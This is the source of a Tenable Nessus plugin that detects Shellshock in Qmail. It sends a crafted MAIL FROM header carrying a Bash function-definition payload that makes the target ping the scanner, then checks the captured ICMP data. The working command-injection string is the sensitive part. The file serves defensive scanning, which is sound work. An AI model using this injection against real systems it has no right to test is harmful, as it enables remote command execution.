#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(77970);
  script_version("1.15");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/12/05");

  script_cve_id("CVE-2014-6271", "CVE-2014-7169");
  script_bugtraq_id(70103, 70137);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/07/28");
  script_xref(name:"CEA-ID", value:"CEA-2019-0240");

  script_name(english:"Qmail Remote Command Execution via Shellshock");

  script_set_attribute(attribute:"synopsis", value:
"The remote mail server allows remote command execution via Shellshock.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running Qmail. A remote attacker can
exploit Qmail to execute commands via a specially crafted MAIL FROM
header if the remote host has a vulnerable version of Bash. This is
due to the fact that Qmail does not properly sanitize input before
setting environmental variables.

A negative result from this plugin does not prove conclusively that
the remote system is not affected by Shellshock, only that Qmail could
not be used to exploit the Shellshock flaw.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:
"Apply the referenced Bash patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-7169");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Qmail SMTP Bash Environment Variable Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:qmail:qmail");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"SMTP problems");

  script_copyright(english:"This script is Copyright (C) 2014-2022 Tenable Network Security, Inc.");

  script_dependencies("smtpserver_detect.nasl");
  script_require_keys("Settings/ThoroughTests");
  script_require_ports("Services/smtp", 25);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("byte_func.inc");
include("misc_func.inc");
include("smtp_func.inc");

if (! thorough_tests ) audit(AUDIT_THOROUGH);

port = get_service(svc: "smtp", default: 25, exit_on_fail: 1);

# Don't really care if its not qmail
isqm = get_kb_item("SMTP/"+port+"/qmail");
if(isnull(isqm) || !isqm) audit(AUDIT_NOT_DETECT,"Qmail",port);

# Don't bother if we cant open a proper port
soc = smtp_open(port:port, helo:this_host_name());
if (!soc) audit(AUDIT_SVC_FAIL,"SMTP",port);
close(soc);

users = make_list(
  "admin",
  "qmail",
  "root",
  "alias",
  "qmail-postmaster",
  "qmail-abuse",
  "qmail-root"
);
traitor = NULL;

foreach user (users)
{
  # Open a connection. Skip to next user if we fail
  soc = smtp_open(port:port, helo:this_host_name());
  if (!soc) continue;
  ptrn = hexstr(rand_str(length:15));
  attk = "() { :;}; ping -p "+ptrn+" -c 3 "+this_host_name();

  send(socket:soc,data:'MAIL FROM: <'+attk+'>\r\n');
  s = smtp_recv_line(socket:soc);
  if(!strlen(s) || !ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
  {
    close(soc);
    continue; # Next user
  }
  # Has to be a valid user on the system, we try defaults
  send(socket:soc,data:'RCPT TO: <'+user+'@'+get_host_name()+'>\r\n');
  s = smtp_recv_line(socket:soc);
  if(!strlen(s) || !ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
  {
    close(soc);
    continue; # Next user
  }
  send(socket:soc,data:'DATA\r\n');
  s = smtp_recv_line(socket:soc);
  if(!strlen(s) || !ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
  {
    close(soc);
    continue; # Next user
  }

  # See if we get a response
  filter = string("icmp and icmp[0] = 8 and src host ", get_host_ip());
  s = send_capture(socket:soc,data:'Subject:Vuln\r\n.\r\n',pcap_filter:filter);
  s = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
  close(soc);

  # No response, meaning we didn't get in
  if(isnull(s) || ptrn >!< s) continue; # Next user

  # We got in, that's good enough
  traitor = user;
  break;
}

# Couldn't get in
if(isnull(traitor)) audit(AUDIT_LISTEN_NOT_VULN,"Qmail",port);

traitor = traitor+"@"+get_host_name();
if(report_verbosity > 0)
{
  report = "Nessus was able to execute a remote command by sending a message to "+traitor+'\n';
  security_hole(port:port,extra:report);
} else security_hole(port);
